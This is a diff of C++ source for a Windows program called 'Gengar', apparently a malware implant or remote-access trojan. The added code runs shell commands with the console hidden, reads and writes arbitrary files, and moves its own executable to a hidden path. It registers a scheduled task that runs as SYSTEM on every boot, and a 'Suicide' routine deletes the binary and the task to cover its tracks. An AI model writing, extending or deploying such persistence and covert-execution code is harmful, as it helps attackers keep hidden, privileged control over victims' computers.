@@ -1,25 +1,19 @@
-#include <sstream>
+#include <iostream>
+#include <fstream>
 #include <boost/process.hpp>
+#include <boost/process/windows.hpp>
 #include "machine.h"
+#include "config.h"
+#include "utils.h"
 
-namespace bp = boost::process;
-const std::string TASK_NAME = "Gengar";
-
-std::string quotify(std::string str)
+Machine::Machine()
 {
-	return '"' + str + '"';
+	// Persist();
 }
 
-void ReadStream(bp::ipstream& stream, std::string& output)
+void Machine::ShowMessageBox(std::string title, std::string content)
 {
-	std::string buff;
-	while (std::getline(stream, buff))
-	{
-		if (buff.back() == '\r')
-			buff.pop_back();
-		buff.push_back('\n');
-		output.append(buff);
-	}
+	MessageBoxA(nullptr, content.c_str(), title.c_str(), 0);
 }
 
 std::string Machine::RunShellCommand(std::string cmd)
@@ -27,25 +21,49 @@ std::string Machine::RunShellCommand(std::string cmd)
 	std::string output;
 	bp::ipstream out_stream, err_stream;
 
-	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream);
+	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream, bp::windows::create_no_window);
 	ReadStream(out_stream, output);
 	ReadStream(err_stream, output);
 	return output;
 }
 
+void Machine::WriteFile(std::string data, std::string path)
+{
+	std::ofstream file;
+	file.open(path, std::ios::binary);
+	file << data;
+	file.close();
+}
+
+std::string Machine::ReadFile(std::string path)
+{
+	std::ifstream file;
+	file.open(path, std::ios::binary);
+	std::string data{ (std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()) };
+	file.close();
+	return data;
+}
+
 void Machine::Persist()
 {
-	std::ostringstream cmd;
-	const short buff_size = 128;
-	char exe_path[buff_size];
-
-	GetModuleFileNameA(nullptr, exe_path, buff_size);
-	cmd << "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " << quotify(TASK_NAME) << " /TR " << quotify(exe_path);
-	RunShellCommand(cmd.str());
+	MoveGengarToHiddenPath();
+	ScheduleGengarOnBoot();
 }
 
 void Machine::Suicide()
 {
-	RunShellCommand("schtasks /Delete /F /TN " + TASK_NAME);
-	std::exit(0);
+	DeleteGengar();
+	DeleteGengarSchedule();
+	std::exit(EXIT_SUCCESS);
 }
+
+void Machine::MoveGengarToHiddenPath() { MoveFileA(GetGengarPath().c_str(), GENGAR_PATH); }
+
+void Machine::ScheduleGengarOnBoot()
+{
+	RunShellCommand("schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " + quotify(TASK_NAME) + " /TR " + quotify(GENGAR_PATH));
+}
+
+void Machine::DeleteGengar() { DeleteFileA(GENGAR_PATH); }
+
+void Machine::DeleteGengarSchedule() { RunShellCommand("schtasks /Delete /F /TN " + quotify(TASK_NAME)); }
